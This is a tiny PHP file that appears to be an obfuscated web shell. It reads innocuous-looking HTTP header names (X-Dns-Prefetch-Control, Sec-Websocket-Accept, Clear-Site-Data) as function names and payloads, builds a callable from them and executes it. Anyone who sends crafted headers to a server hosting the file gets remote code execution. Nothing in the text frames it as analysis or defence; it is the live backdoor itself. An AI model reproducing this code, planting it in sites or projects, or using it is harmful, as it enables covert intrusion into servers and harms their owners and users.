<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $uconvert = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Clear-Site-Data']));
    $uconvert();
}